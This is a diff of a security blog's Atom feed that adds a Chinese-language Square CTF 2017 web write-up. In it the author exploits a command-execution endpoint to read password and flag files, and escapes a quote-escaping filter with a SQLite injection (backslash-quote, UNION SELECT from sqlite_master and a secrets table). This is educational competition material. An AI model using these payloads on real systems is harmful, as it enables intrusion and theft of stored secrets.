@@ -278,20 +278,6 @@
   </entry>
   
   <entry>
-    <title>DedeCms v5.7 sp2-漏洞集合分析</title>
-    <link href="http://chybeta.github.io/2018/01/21/DedeCms-v5-7-sp2-%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%88%86%E6%9E%90/"/>
-    <id>http://chybeta.github.io/2018/01/21/DedeCms-v5-7-sp2-漏洞集合分析/</id>
-    <published>2018-01-20T23:20:15.000Z</published>
-    <updated>2018-01-20T23:20:15.708Z</updated>
-    
-    <summary type="html">
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
     <title>赛博地球杯工业互联网安全大赛-Web-writeup</title>
     <link href="http://chybeta.github.io/2018/01/18/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-writeup/"/>
     <id>http://chybeta.github.io/2018/01/18/赛博地球杯工业互联网安全大赛-Web-writeup/</id>
@@ -1571,6 +1557,58 @@
       <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
     
       <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Square CTF 2017-Web-writeup</title>
+    <link href="http://chybeta.github.io/2017/10/05/Square-CTF-2017-Web-writeup/"/>
+    <id>http://chybeta.github.io/2017/10/05/Square-CTF-2017-Web-writeup/</id>
+    <published>2017-10-05T12:01:19.000Z</published>
+    <updated>2017-10-05T12:20:08.554Z</updated>
+    
+    <content type="html"><![CDATA[<p>Password checker： 代码执行<br>Little Doggy Tables： SQL注入<br><a id="more"></a></p>
+<h1 id="Password-checker-50"><a href="#Password-checker-50" class="headerlink" title="Password checker 50"></a>Password checker 50</h1><h2 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://nybas-berog-bitev-fuhyn-fehyt.capturethesquare.com/</div></pre></td></tr></table></figure>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>查看源代码，发现有如下js：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params">objForm</span>) </span>&#123;</div><div class="line">  <span class="keyword">let</span> toBeCheckedValue = objForm.elements[<span class="string">'password'</span>].value;</div><div class="line"></div><div class="line">  <span class="keyword">let</span> xmlHttp = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">  xmlHttp.open(<span class="string">'GET'</span>, <span class="string">'/run.php?cmd=cat%20../password.txt'</span>, <span class="literal">false</span>);</div><div class="line">  xmlHttp.send(<span class="literal">null</span>);</div><div class="line">  <span class="keyword">let</span> actualValue = xmlHttp.responseText;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (toBeCheckedValue != actualValue) &#123;</div><div class="line">    alert(<span class="string">'Passwords don\'t match!'</span>);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    alert(<span class="string">'Password validated!'</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
+<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://nybas-berog-bitev-fuhyn-fehyt.capturethesquare.com//run.php?cmd=cat%20../password.txt</div></pre></td></tr></table></figure></p>
+<p>得到密码：password123 ，输进去后只是弹出一个提示框。</p>
+<p>考虑命令执行，尝试查找flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://nybas-berog-bitev-fuhyn-fehyt.capturethesquare.com/run.php?cmd=find / | grep flag</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171005/1.png?raw=true" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://nybas-berog-bitev-fuhyn-fehyt.capturethesquare.com/run.php?cmd=cat /secrets/..109810_05_10_06_49_46.546032825/flag</div></pre></td></tr></table></figure>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag-tyzyd-gateh-lefif-girav-bobut</div></pre></td></tr></table></figure></p>
+<p>另外读到run.php的源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$line = exec($_GET[<span class="string">'cmd'</span>]);</div><div class="line"><span class="keyword">echo</span> $line;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<h1 id="Little-Doggy-Tables-100"><a href="#Little-Doggy-Tables-100" class="headerlink" title="Little Doggy Tables 100"></a>Little Doggy Tables 100</h1><h2 id="Task-1"><a href="#Task-1" class="headerlink" title="Task"></a>Task</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&quot;Oh, so you found it. Yes, it will tell you if a given agent is a dog or a cat, by looking up the appropriate value in its SQLite database. Good luck with that.</div><div class="line"></div><div class="line">&quot;Sure, the database contains some sensitive information, but our bulletproof firewall and top-notch quote escaping will ensure it never sees the light of day.</div><div class="line"></div><div class="line">&quot;Not secure? Huh? You don’t believe me? I’ll show you how secure. Here’s the source!&quot;</div><div class="line"></div><div class="line">USAGE EXAMPLE:</div><div class="line"></div><div class="line">curl &quot;https://little-doggy-tables.capturethesquare.com/agent_lookup&quot; --get --data-urlencode &quot;codename=Fido&quot;</div><div class="line">https://little-doggy-tables.capturethesquare.com</div></pre></td></tr></table></figure>
+<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>源码如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="comment"># author: Will McChesney &lt;wmcc<span class="doctag">@squareup</span>.com&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">"sqlite3"</span></div><div class="line"><span class="keyword">require</span> <span class="string">"webrick"</span></div><div class="line"></div><div class="line">PORT = ARGV[<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecureDatastore</span></span></div><div class="line">  <span class="keyword">include</span> Singleton</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span></span></div><div class="line">    @db = SQLite3::Database.new(<span class="string">"secure.db"</span>)</div><div class="line">  <span class="keyword">end</span></div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">secure_species_lookup</span><span class="params">(insecure_codename)</span></span></div><div class="line">    <span class="comment"># roll our own escaping to prevent SQL injection attacks</span></div><div class="line">    secure_codename = insecure_codename.gsub(<span class="string">"'"</span>, Regexp.escape(<span class="string">"\\'"</span>))</div><div class="line">    query = <span class="string">"SELECT species FROM operatives WHERE codename = '<span class="subst">#&#123;secure_codename&#125;</span>';"</span></div><div class="line"></div><div class="line">    puts query</div><div class="line">    results = @db.execute(query)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">if</span> results.length == <span class="number">0</span></div><div class="line">    results[<span class="number">0</span>][<span class="number">0</span>]</div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">server = WEBrick::HTTPServer.new(<span class="symbol">Port:</span> PORT)</div><div class="line"></div><div class="line">trap(<span class="string">"INT"</span>) &#123; server.shutdown &#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AgentLookupServlet</span> &lt; WEBrick::HTTPServlet::<span class="title">AbstractServlet</span></span></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(request, response)</span></span></div><div class="line">    response.status = <span class="number">200</span></div><div class="line">    response[<span class="string">"Content-Type"</span>] = <span class="string">"text/plain"</span></div><div class="line"></div><div class="line">    response.body = SecureDatastore.instance.secure_species_lookup(request.query[<span class="string">"codename"</span>]) + <span class="string">"\n"</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">server.mount <span class="string">"/agent_lookup"</span>, AgentLookupServlet</div><div class="line"></div><div class="line">server.start</div></pre></td></tr></table></figure></p>
+<p>从题目的一大段描述，以及给出的源码来看应该是考察SQLite3注入。<br>关键在于下面这两句代码：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">secure_codename = insecure_codename.gsub(<span class="string">"'"</span>, Regexp.escape(<span class="string">"\\'"</span>))</div><div class="line">query = <span class="string">"SELECT species FROM operatives WHERE codename = '<span class="subst">#&#123;secure_codename&#125;</span>';"</span></div></pre></td></tr></table></figure></p>
+<p>会将单引号<code>&#39;</code> 通过正则替换成<code>\&#39;</code>进行转义，来阻止我们闭合。但如果我们传入<code>\&#39;</code>，则在通过正则替换后会变成<code>\\&#39;</code>，其中第二个’\’是正则添加的，配合我们传入的<code>\</code>，会被转义，从而使我们的单引号逃逸。</p>
+<p>在sqlite中，注释符为<code>--</code>，尝试访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://little-doggy-tables.capturethesquare.com/agent_lookup?codename=\&apos; or 1=1 --</div></pre></td></tr></table></figure></p>
+<p>则服务器端执行的数据库查询语句如下，注意<code>\\</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT species FROM operatives WHERE codename = &apos;\\&apos; or 1=1 --&apos;;</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171005/2.png?raw=true" alt=""></p>
+<p>单引号逃逸成功。</p>
+<p>接下去考虑如何注出数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://little-doggy-tables.capturethesquare.com/agent_lookup?codename=\&apos;  union select sql from sqlite_master  limit 0,1--</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171005/4.png?raw=true" alt=""></p>
+<p>说明operatives表里有三个字段：codename，species，secret 。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://little-doggy-tables.capturethesquare.com/agent_lookup</div><div class="line">?codename=\&apos;  union select secret  from operatives   limit 0,1--</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171005/3.png?raw=true" alt=""></p>
+<p>直接提交不对。。。后面发现应该要改变limit。最后payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://little-doggy-tables.capturethesquare.com/agent_lookup</div><div class="line">?codename=\&apos;  union select secret  from operatives   limit 9,1--</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171005/5.png?raw=true" alt=""></p>
+<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag-a3db5c13ff90a36963278c6a39e4ee3c22e2a436</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Password checker： 代码执行&lt;br&gt;Little Doggy Tables： SQL注入&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
+    
+      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
     
   </entry>
   
